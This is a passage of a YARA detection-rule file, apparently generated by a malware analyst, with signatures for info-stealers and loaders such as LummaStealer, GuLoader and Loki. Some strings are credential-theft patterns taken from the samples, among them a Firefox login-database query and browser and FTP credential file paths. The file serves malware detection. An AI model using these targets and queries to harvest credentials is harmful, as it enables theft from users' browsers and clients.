      $s6 = "runtime.injectglist" fullword ascii /* score: '20.00'*/
      $s7 = "runtime.tracebackHexdump.func1" fullword ascii /* score: '20.00'*/
      $s8 = "runtime.hexdumpWords" fullword ascii /* score: '20.00'*/
      $s9 = "*runtime.mutex" fullword ascii /* score: '18.00'*/
      $s10 = "runtime.getlasterror" fullword ascii /* score: '18.00'*/
      $s11 = "runtime.(*rwmutex).rlock.func1" fullword ascii /* score: '18.00'*/
      $s12 = "runtime.(*rwmutex).runlock" fullword ascii /* score: '18.00'*/
      $s13 = "runtime.(*rwmutex).rlock" fullword ascii /* score: '18.00'*/
      $s14 = "runtime.putempty" fullword ascii /* score: '17.00'*/
      $s15 = "runtime.startTemplateThread" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _MassLogger_signature__1895460fffad9475fda0c84755ecfee1_imphash__MetaStealer_signature__1895460fffad9475fda0c84755ecfee1_imp_8 {
   meta:
      description = "_subset_batch - from files MassLogger(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, MetaStealer(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, MetaStealer(signature)_91d07a5e22681e70764519ae943a5883(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4691af5573a42882f8a2814929d7da66de7fb1ed87970957a4fbfb9b40da2c89"
      hash2 = "5f5a466793a001e84271e4ead05ddaf9c42f1496bb14d984ad63669258c12913"
      hash3 = "bb5b6c5401b0d6b36d14564c6275093d5e4d89faf6290b8f2d716bd535eaa504"
   strings:
      $s1 = "/AutoIt3ExecuteScript" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s2 = "/AutoIt3ExecuteLine" fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s3 = "PROCESSGETSTATS" fullword wide /* score: '22.50'*/
      $s4 = "WINGETPROCESS" fullword wide /* score: '22.50'*/
      $s5 = "SCRIPTNAME" fullword wide /* base64 encoded string */ /* score: '22.50'*/
      $s6 = "SHELLEXECUTEWAIT" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s7 = "SHELLEXECUTE" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s8 = "*Unable to get a list of running processes." fullword wide /* score: '20.00'*/
      $s9 = "PROCESSSETPRIORITY" fullword wide /* score: '17.50'*/
      $s10 = "HTTPSETUSERAGENT" fullword wide /* score: '17.50'*/
      $s11 = "PROCESSWAITCLOSE" fullword wide /* score: '17.50'*/
      $s12 = "PROCESSEXISTS" fullword wide /* score: '17.50'*/
      $s13 = "PROCESSCLOSE" fullword wide /* score: '17.50'*/
      $s14 = "PROCESSWAIT" fullword wide /* score: '17.50'*/
      $s15 = "PROCESSLIST" fullword wide /* score: '17.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Kimsuky_signature__b66e456457142424c4274ccc4a6e3326_imphash__LummaStealer_signature__c7269d59926fa4252270f407e4dab043_impha_9 {
   meta:
      description = "_subset_batch - from files Kimsuky(signature)_b66e456457142424c4274ccc4a6e3326(imphash).exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "84f4f2e77b6e59c1fe54360842821fbfc6cdab039f197147b30876ed7da3647c"
      hash2 = "f37b9940d7ab8158b62bd0ca600cde35dffc36d64f5820931de7da9626fbe478"
   strings:
      $s1 = "os.(*ProcessState).Sys" fullword ascii /* score: '30.00'*/
      $s2 = "os.(*ProcessState).sys" fullword ascii /* score: '30.00'*/
      $s3 = "os/exec.Command" fullword ascii /* score: '24.00'*/
      $s4 = "os/exec.(*Cmd).closeDescriptors" fullword ascii /* score: '23.00'*/
      $s5 = "os.Executable" fullword ascii /* score: '20.00'*/
      $s6 = "/*struct { F uintptr; pw *os.File; c *exec.Cmd }" fullword ascii /* score: '20.00'*/
      $s7 = "*exec.Cmd" fullword ascii /* score: '20.00'*/
      $s8 = "os/exec.(*Cmd).Run" fullword ascii /* score: '20.00'*/
      $s9 = "os/exec.(*Cmd).writerDescriptor.func1" fullword ascii /* score: '20.00'*/
      $s10 = "os/exec.(*Cmd).writerDescriptor" fullword ascii /* score: '20.00'*/
      $s11 = "syscall.GetCurrentProcess" fullword ascii /* score: '19.00'*/
      $s12 = "syscall.GetProcessTimes" fullword ascii /* score: '19.00'*/
      $s13 = "syscall.GetExitCodeProcess" fullword ascii /* score: '19.00'*/
      $s14 = "internal/testlog.Logger" fullword ascii /* score: '18.00'*/
      $s15 = "*func(*os.Process) error" fullword ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _GuLoader_signature__262ff5ee_GuLoader_signature__dcb3432b_10 {
   meta:
      description = "_subset_batch - from files GuLoader(signature)_262ff5ee.vbs, GuLoader(signature)_dcb3432b.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "262ff5eea703a57d51eda2138ed6e71dc041303a457ad3c374323b9aba832b55"
      hash2 = "dcb3432bec7c79475146fa07bf058c4b478aac94e6bb611d541890a7a5fa942b"
   strings:
      $s1 = "Interconnectionshjlpe = Command " fullword ascii /* score: '17.00'*/
      $s2 = "Uopdagetbinderiesv = Uopdagetbinderiesv * (1+1)" fullword ascii /* score: '16.00'*/
      $s3 = "Rem Trackpot? tempelhal. squamosoradiate: oprundnes" fullword ascii /* score: '14.00'*/
      $s4 = "Rem Postganges128! gaincome ansttelsesperioders13 interspersions tait?" fullword ascii /* score: '12.00'*/
      $s5 = "Rem Staldfidusers medisterplse" fullword ascii /* score: '12.00'*/
      $s6 = "Curculionidaejockeyern = MidB(\"Afvigende\", 15, 228)" fullword ascii /* score: '12.00'*/
      $s7 = "Rem Beteem: breviloquence langfingrenes superport udbenede" fullword ascii /* score: '12.00'*/
      $s8 = "Rem laudanidine antetemple; bigotteriets" fullword ascii /* score: '11.00'*/
      $s9 = "Rem Embeggar potchermen; tempesting161?" fullword ascii /* score: '11.00'*/
      $s10 = "Rem Sesambollens, templize reconquest131, menziesia16" fullword ascii /* score: '11.00'*/
      $s11 = "Const Forfladigende = \"bistandsorganisation. perisomatic:\"" fullword ascii /* score: '10.00'*/
      $s12 = "Rem scriptoria vesicularity ministerprsidenten:" fullword ascii /* score: '10.00'*/
      $s13 = "Rem Archaeogeology184! rudevasker! reseason" fullword ascii /* score: '9.00'*/
      $s14 = "Rem Hydroconion195. reflate bebyggelses! taffelbjerget:" fullword ascii /* score: '9.00'*/
      $s15 = "Rem Forledtes: stofskifte; tegningsindbydelse sulphostannite" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x7546 and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__c7269d59926fa4252270f407e4dab043_imphash__d20503a6_LummaStealer_signature__c7269d59926fa4252270f407_11 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_d20503a6.exe, LummaStealer(signature)_c7269d59926fa4252270f407e4dab043(imphash)_ea37de23.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d20503a6c683c4cfddc10051531db2ab1b43be7d1b786d71f65938ce84812bbe"
      hash2 = "ea37de23a99f57a12361c094bfedc9cb91356f1d729a313ae68fcb86febf5701"
   strings:
      $x1 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x2 = ".lib section in a.out corruptedbad write barrier buffer boundscannot assign requested addresscasgstatus: bad incoming valueschec" ascii /* score: '46.50'*/
      $x3 = "unknown pcws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= idleprocs= in status  mallocing= ms clock,  nBSSRoot" ascii /* score: '43.00'*/
      $x4 = "RtlGetNtVersionNumbersaddress already in useadvapi32.dll not foundargument list too longassembly checks failedbad g->status in r" ascii /* score: '42.00'*/
      $x5 = "WriteProcessMemorybad manualFreeListconnection refusedfaketimeState.lockfile name too longforEachP: not donegarbage collectionid" ascii /* score: '42.00'*/
      $x6 = "mismatched count during itab table copymspan.sweep: bad span state after sweepout of memory allocating heap arena mapruntime: ca" ascii /* score: '41.00'*/
      $x7 = "WSAEnumProtocolsWbad TinySizeClassdebugPtrmask.lockentersyscallblockexec format errorg already scannedglobalAlloc.mutexlocked m0" ascii /* score: '38.00'*/
      $x8 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '38.00'*/
      $x9 = " to unallocated spanCertOpenSystemStoreWCreateProcessAsUserWCryptAcquireContextWGetAcceptExSockaddrsGetCurrentDirectoryWGetFileA" ascii /* score: '37.00'*/
      $x10 = "Go pointer stored into non-Go memoryUnable to determine system directoryaccessing a corrupted shared libraryruntime: VirtualQuer" ascii /* score: '36.00'*/
      $x11 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dllmadvdontneedmheapSpecialmspanSpe" ascii /* score: '32.00'*/
      $s12 = "ddetailsecur32.dllshell32.dlltracealloc(unreachableuserenv.dll KiB total,  [recovered] allocCount  found at *( gcscandone  heapM" ascii /* score: '30.00'*/
      $s13 = " to non-Go memory , locked to threadCommandLineToArgvWCreateFileMappingWGetExitCodeProcessGetFileAttributesWLookupAccountNameWRF" ascii /* score: '29.00'*/
      $s14 = "egEnumKeyExWRegOpenKeyExWVirtualUnlockWriteConsoleWadvapi32.dll" fullword ascii /* score: '28.00'*/
      $s15 = "structure needs cleaning bytes failed with errno= to unused region of span with too many arguments GODEBUG: can not enable \"Get" ascii /* score: '27.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "c7269d59926fa4252270f407e4dab043" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__026dda6001e8c6dbad9456432b0003ba_imphash__LummaStealer_signature__3c9ed1bacd930c37be812d1f382b945f__12 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_026dda6001e8c6dbad9456432b0003ba(imphash).exe, LummaStealer(signature)_3c9ed1bacd930c37be812d1f382b945f(imphash).exe, LummaStealer(signature)_a1ff5e4ca616afab58cf57e2fa1763ee(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5634306e445a5a62c5cb81dba6663a5c1d7eb8e562b8c1430dfa6c8242e75f5d"
      hash2 = "7a96989dad3e9c90ef7dd009289c8f5f1ba830e42e24f75e6f0c4ea8f813894d"
      hash3 = "e0fad9f7ce6c5c4f2f3e61b11b38b65da4de8174e0ef574848f3d1488fc1a828"
   strings:
      $s1 = "BBBBBBBBBBBBBBBBBBBB" wide /* reversed goodware string 'BBBBBBBBBBBBBBBBBBBB' */ /* score: '16.50'*/
      $s2 = "max rootpage (%d) disagrees with header (%d)" fullword ascii /* score: '15.00'*/
      $s3 = "hex literal too big: %s%s" fullword ascii /* score: '11.00'*/
      $s4 = ";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;" fullword wide /* reversed goodware string ';;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;' */ /* score: '11.00'*/
      $s5 = "yyyywwwwvvuuut" fullword wide /* score: '11.00'*/
      $s6 = "yyyyruuut" fullword wide /* score: '11.00'*/
      $s7 = "xxyyyywwwwvvuuut" fullword wide /* score: '11.00'*/
      $s8 = "Fragmentation of %d bytes reported as %d on page %u" fullword ascii /* score: '10.00'*/
      $s9 = " VIRTUAL TABLE INDEX %d:%s" fullword ascii /* score: '9.50'*/
      $s10 = "On tree page %u cell %d: " fullword ascii /* score: '9.50'*/
      $s11 = "me_test(%Q, sql, type, name, %d, %Q, %Q)=NULL " fullword ascii /* score: '9.50'*/
      $s12 = "fghijklmnop" fullword wide /* score: '8.00'*/
      $s13 = "jklmnop" fullword wide /* score: '8.00'*/
      $s14 = "fghijklmnopp" fullword wide /* score: '8.00'*/
      $s15 = "xfghijklmnop" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__04eca2d8_MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5_13 {
   meta:
      description = "_subset_batch - from files MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_04eca2d8.exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0bd1c5cb.exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_44f1a67e.exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_85ec1151.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "04eca2d8e55732a9c4d49d7fc90bd2e9996903df22bb76e77797b08252c517a8"
      hash2 = "0bd1c5cb9f1a1f2dd30a3fc2188b542364a4cd051c48a1c3ce816bb4ea75c512"
      hash3 = "44f1a67e4a326b1f751b8e0671a46ff65acd9c8e9c515c764c41c87c3bf9cca8"
      hash4 = "85ec11517de659f7a359f0fac6b06e53229e67bc3ee46bb942c2d4d692cd0982"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD*G" fullword ascii /* score: '27.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD4T" fullword ascii /* score: '27.00'*/
      $s3 = "iamgeB.ErrorImage" fullword wide /* score: '10.00'*/
      $s4 = "iamgeA.ErrorImage" fullword wide /* score: '10.00'*/
      $s5 = "get_gold_bars" fullword ascii /* score: '9.00'*/
      $s6 = "getHeigh" fullword ascii /* score: '9.00'*/
      $s7 = "getWeight" fullword ascii /* score: '9.00'*/
      $s8 = "labelComp2" fullword wide /* score: '8.00'*/
      $s9 = "labelComp4" fullword wide /* score: '8.00'*/
      $s10 = "labelComp5" fullword wide /* score: '8.00'*/
      $s11 = "labelComp1" fullword wide /* score: '8.00'*/
      $s12 = "labelComp3" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__MetaStealer_signature__MetaStealer_signature__bbab4a89_14 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature).msi, MetaStealer(signature).msi, MetaStealer(signature)_bbab4a89.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4cb6ec9522d8c1315cd3a2985d2204c634edc579b08a1b132254bd7dd5df72d8"
      hash2 = "94d81ac9d0d494318c5e37b755d954378314936b47d2a68927ea933638bb6c5e"
      hash3 = "bbab4a89983f4e585fe856afb9c899af8a7ed97e58bdd6e41e530d29bf906c42"
   strings:
      $x1 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii /* score: '31.00'*/
      $s2 = " - UNREGISTERED - Wrapped using MSI Wrapper from www.exemsi.com" fullword wide /* score: '26.00'*/
      $s3 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii /* score: '23.00'*/
      $s4 = "MsiCustomActions.dll" fullword ascii /* score: '23.00'*/
      $s5 = "C:\\ss2\\Projects\\MsiWrapper\\MsiCustomActions\\Release\\MsiCustomActions.pdb" fullword ascii /* score: '22.00'*/
      $s6 = "Error removing temp executable." fullword wide /* score: '22.00'*/
      $s7 = "EXPAND.EXE" fullword wide /* score: '22.00'*/
      $s8 = " format.InstallExecuteSequenceInstallUISequenceLaunchConditionExpression which must evaluate to TRUE in order for install to com" ascii /* score: '21.00'*/
      $s9 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii /* score: '20.00'*/
      $s10 = "OS supports elevation" fullword wide /* score: '19.00'*/
      $s11 = "OS does not support elevation" fullword wide /* score: '19.00'*/
      $s12 = "ack cabinet order.IconPrimary key. Name of the icon file.Binary stream. The binary icon data in PE (.DLL or .EXE) or icon (.ICO)" ascii /* score: '18.00'*/
      $s13 = "Execute view" fullword wide /* score: '18.00'*/
      $s14 = "ICACLS.EXE" fullword wide /* score: '18.00'*/
      $s15 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 17000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _GuLoader_signature__GuLoader_signature__18386a8b_15 {
   meta:
      description = "_subset_batch - from files GuLoader(signature).js, GuLoader(signature)_18386a8b.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fb0474ff5b6eb9092eeecc6dcb831dd538a72878e39afbfd7d088d0532d03ba2"
      hash2 = "18386a8b8abb8bafc43132c737af5d5e7d688aafe72d6cc37c76ce05634ed22c"
   strings:
      $s1 = "//Ekskluder, byg! udviklingsprocesserne sinningness" fullword ascii /* score: '15.00'*/
      $s2 = "Waxcombblunthearte = \"Journaliseringssystemerne\" + \"Sjlekampes31\";" fullword ascii /* score: '14.00'*/
      $s3 = "//Arbejdskataloget endnote" fullword ascii /* score: '14.00'*/
      $s4 = "//Tnderklaprendes. autovaskeanlggene proabsolutism? misexecute? skringers?" fullword ascii /* score: '14.00'*/
      $s5 = "WScript.Sleep(21);" fullword ascii /* score: '13.00'*/
      $s6 = "//Moho: lionizables overcommand;" fullword ascii /* score: '12.00'*/
      $s7 = "//Headwinds. unchancy, mobble communionable: skidtfiskens" fullword ascii /* score: '12.00'*/
      $s8 = "//Disable tvangsarvings blindtarmsoperation cotrespasser" fullword ascii /* score: '12.00'*/
      $s9 = "//Postpositive passangrahan unpraying:" fullword ascii /* score: '12.00'*/
      $s10 = "//Autovrkstedernes. bogtrykkerkunst21 merogenic sprgetiders; comaerne131?" fullword ascii /* score: '12.00'*/
      $s11 = "//Dipso executry brinkmanship." fullword ascii /* score: '12.00'*/
      $s12 = "//Corrival: commandatory11!" fullword ascii /* score: '12.00'*/
      $s13 = "//Sperlingerne? nedkommet? commander optrykke. cushite," fullword ascii /* score: '12.00'*/
      $s14 = "//Headrope: overbody" fullword ascii /* score: '11.00'*/
      $s15 = "//Conjugations, totemplenes stauracin." fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__LummaStealer_signature__a520fd20530cf0b0db6a6c3c8b88d11d__16 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_93b67e92.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "852fd8e572f18ab2f694153a8943c2ef198c2a5bf6179e7bef30c6dc79f84811"
      hash2 = "93b67e925e2b9bfe548c1437a40bc558b2b598f5f9c40c34c7c372814e8b89f4"
   strings:
      $x1 = ".lib section in a.out corruptedbad write barrier buffer boundscall from within the Go runtimecannot assign requested addresscasg" ascii /* score: '51.00'*/
      $x2 = "stopTheWorld: not stopped (status != _Pgcstop)P has cached GC work at end of mark terminationattempting to link in too many shar" ascii /* score: '47.00'*/
      $x3 = "bad lfnode addressbad manualFreeListconnection refusedfile name too longforEachP: not donegarbage collectionidentifier removedin" ascii /* score: '46.00'*/
      $x4 = "GetAddrInfoWGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWSetEndOfFileTransmitFile_MSpanManualabi mism" ascii /* score: '44.00'*/
      $x5 = "unknown pcws2_32.dll  of size   (targetpc= gcwaiting= gp.status= heap_live= idleprocs= in status  m->mcache= mallocing= ms clock" ascii /* score: '43.00'*/
      $x6 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: gp: gp=runtime: nelems=schedule: in cgo" ascii /* score: '43.00'*/
      $x7 = "address already in useadvapi32.dll not foundargument list too longassembly checks failedbad g->status in readycall not at safe p" ascii /* score: '39.00'*/
      $x8 = "file descriptor in bad statefindrunnable: netpoll with pgchelperstart: bad m->helpgcgcstopm: negative nmspinninginvalid runtime " ascii /* score: '38.00'*/
      $x9 = "ted waitm - semaphore out of syncs.allocCount != s.nelems && freeIndex == s.nelemsattempt to execute system stack code on user s" ascii /* score: '35.00'*/
      $x10 = "bad map stateexchange fullfatal error: gethostbynamegetservbynamekernel32.dll" fullword ascii /* score: '33.00'*/
      $x11 = "atchadvapi32.dllbad g statusbad g0 stackbad recoverycan't happencas64 failedchan receivedumping heapend tracegc" fullword ascii /* score: '32.00'*/
      $x12 = " MB) workers= called from  gcscanvalid  heap_marked= idlethreads= is nil, not  s.spanclass= span.base()= syscalltick= work.nproc" ascii /* score: '32.00'*/
      $s13 = "rkrootruntime: VirtualQuery failed; errno=runtime: bad notifyList size - sync=runtime: invalid pc-encoded table f=runtime: inval" ascii /* score: '30.00'*/
      $s14 = "chemswsock.dllscheddetailsecur32.dllshell32.dlltracealloc(unreachableuserenv.dll [recovered] allocCount  found at *( gcscandone " ascii /* score: '30.00'*/
      $s15 = "p->atomicstatus=CreateSymbolicLinkWCryptReleaseContextGetCurrentProcessIdGetTokenInformationMSpan_Sweep: state=WaitForSingleObje" ascii /* score: '28.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Loki_signature__0239fd611af3d0e9b0c46c5837c80e09_imphash__Loki_signature__0239fd611af3d0e9b0c46c5837c80e09_imphash__122faf1_17 {
   meta:
      description = "_subset_batch - from files Loki(signature)_0239fd611af3d0e9b0c46c5837c80e09(imphash).exe, Loki(signature)_0239fd611af3d0e9b0c46c5837c80e09(imphash)_122faf1d.exe, Loki(signature)_0239fd611af3d0e9b0c46c5837c80e09(imphash)_4d89753d.exe, Loki(signature)_0239fd611af3d0e9b0c46c5837c80e09(imphash)_a76d443b.exe, Loki(signature)_0239fd611af3d0e9b0c46c5837c80e09(imphash)_b580694e.exe, Loki(signature)_0239fd611af3d0e9b0c46c5837c80e09(imphash)_bcc5d72d.exe, Loki(signature)_0239fd611af3d0e9b0c46c5837c80e09(imphash)_c1b9512e.exe, Loki(signature)_0239fd611af3d0e9b0c46c5837c80e09(imphash)_d998bd42.exe, Loki(signature)_0239fd611af3d0e9b0c46c5837c80e09(imphash)_e0fa3625.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "701b8df01024b15c3b33a77f468345b82af01c85817ec83e6cef861ccdee3dbd"
      hash2 = "122faf1d6f561477954e08ac6a915388d9e449f77a0caa62442c5f4bf99e6083"
      hash3 = "4d89753d2c7f222dbf79a86f7210468d906e527eab63b6e35c16e7fd307f927e"
      hash4 = "a76d443bfd587268d314d346b78fd4e59b84b386f68097a1fa1339658bd2ab83"
      hash5 = "b580694eefba5b5712230dd5f3fb1f008f0c38d1613a4c9983cbdc57e54f7e04"
      hash6 = "bcc5d72d0c979c31a2632c9055dd7bb4f4ea8e3b8dc36f385982a92fd477478b"
      hash7 = "c1b9512ee8fc40c21afcdeb426085940aa63411cf836da3215e33b53e3c63780"
      hash8 = "d998bd4232ffd4b1781fff28431744bec81370200abcf9c483c87af224b5622d"
      hash9 = "e0fa3625c59ff00307dfa141f26a359cb20e1bf2bb1ffe2e93660294be9bfa8c"
   strings:
      $s1 = "SELECT encryptedUsername, encryptedPassword, formSubmitURL, hostname FROM moz_logins" fullword ascii /* score: '25.00'*/
      $s2 = "sCrypt32.dll" fullword wide /* score: '23.00'*/
      $s3 = "SmtpPassword" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s4 = "SMTP Password" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s5 = "FtpPassword" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s6 = "%s\\%s%i\\data\\settings\\ftpProfiles-j.jsd" fullword wide /* score: '21.50'*/
      $s7 = "aPLib v1.01  -  the smaller the better :)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s8 = "%s\\%s\\User Data\\Default\\Login Data" fullword wide /* score: '20.50'*/
      $s9 = "%s%s\\Login Data" fullword wide /* score: '19.00'*/
      $s10 = "%s%s\\Default\\Login Data" fullword wide /* score: '19.00'*/
      $s11 = "%s\\32BitFtp.TMP" fullword wide /* score: '19.00'*/
      $s12 = "%s\\GoFTP\\settings\\Connections.txt" fullword wide /* score: '19.00'*/
      $s13 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook" fullword wide /* score: '18.00'*/
      $s14 = "%s\\Mozilla\\SeaMonkey\\Profiles\\%s" fullword wide /* score: '17.50'*/
      $s15 = "%s\\%s\\%s.exe" fullword wide /* score: '17.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and pe.imphash() == "0239fd611af3d0e9b0c46c5837c80e09" and ( 8 of them )
      ) or ( all of them )
}

rule _MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0dae2a3a_MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5_18 {
   meta:
      description = "_subset_batch - from files MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0dae2a3a.exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_990c77e1.exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f9c86d18.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0dae2a3a734163ec368a271822356004e53f8556ad654956dfd7570a49ba2b20"
      hash2 = "990c77e153654af651dd65621067c83122d88812a97d9a093c86459fe39de6f6"
      hash3 = "f9c86d1815b169a952352073adc608b0e215e9bfb871cd85e59a76d1152aff14"
   strings:
      $s1 = "GetPlainTextContent" fullword ascii /* score: '14.00'*/
      $s2 = "get_PlainTextContent" fullword ascii /* score: '14.00'*/
      $s3 = "get_YouTube_Logo" fullword ascii /* score: '14.00'*/
      $s4 = "SmartNote - Intelligent Note Manager" fullword wide /* score: '12.00'*/
      $s5 = "Text files (*.txt)|*.txt|HTML files (*.html)|*.html" fullword wide /* score: '11.00'*/
      $s6 = "Error exporting notes: " fullword wide /* score: '10.00'*/
      $s7 = "<GetPinnedNotes>b__14_0" fullword ascii /* score: '9.00'*/
      $s8 = "VelvetCircuitOracle" fullword ascii /* score: '9.00'*/
      $s9 = "get_TotalWords" fullword ascii /* score: '9.00'*/
      $s10 = "contentRichTextBox" fullword ascii /* score: '9.00'*/
      $s11 = "<GetAllTags>b__17_0" fullword ascii /* score: '9.00'*/
      $s12 = "<GetStatistics>b__36_2" fullword ascii /* score: '9.00'*/
      $s13 = "<GetNote>b__0" fullword ascii /* score: '9.00'*/
      $s14 = "get_AutoSaveInterval" fullword ascii /* score: '9.00'*/
      $s15 = "<GetNotesByTag>b__13_2" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _HijackLoader_signature__00efed44c47255dff78fbfc7f266ee4b_imphash__LummaStealer_signature__026dda6001e8c6dbad9456432b0003ba__19 {
   meta:
      description = "_subset_batch - from files HijackLoader(signature)_00efed44c47255dff78fbfc7f266ee4b(imphash).exe, LummaStealer(signature)_026dda6001e8c6dbad9456432b0003ba(imphash).exe, LummaStealer(signature)_2cfee53aeb00cd14e32ccbca525e1ea5(imphash).dll, LummaStealer(signature)_3c9ed1bacd930c37be812d1f382b945f(imphash).exe, LummaStealer(signature)_a1ff5e4ca616afab58cf57e2fa1763ee(imphash).exe, MilleniumRAT(signature)_bfc94987b9a21a61fae666713d43dafc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6303338d410eb13056a6667bb03f1ed394bb8c9defb8315aa87aa2db4e01a9f1"
      hash2 = "5634306e445a5a62c5cb81dba6663a5c1d7eb8e562b8c1430dfa6c8242e75f5d"
      hash3 = "3ecf6bbee75710b183deee7f671826f78da55f9f773c1c46b14b2c53bdfe67ce"
      hash4 = "7a96989dad3e9c90ef7dd009289c8f5f1ba830e42e24f75e6f0c4ea8f813894d"
      hash5 = "e0fad9f7ce6c5c4f2f3e61b11b38b65da4de8174e0ef574848f3d1488fc1a828"
      hash6 = "73607f1799be5facd81d484fa6b1f6518378037ef16c32eaa0c562ff49c1e0b5"
   strings:
      $s1 = "UPDATE temp.sqlite_master SET sql = sqlite_rename_column(sql, type, name, %Q, %Q, %d, %Q, %d, 1) WHERE type IN ('trigger', 'view" ascii /* score: '16.50'*/
      $s2 = "UPDATE temp.sqlite_master SET sql = sqlite_rename_column(sql, type, name, %Q, %Q, %d, %Q, %d, 1) WHERE type IN ('trigger', 'view" ascii /* score: '16.50'*/
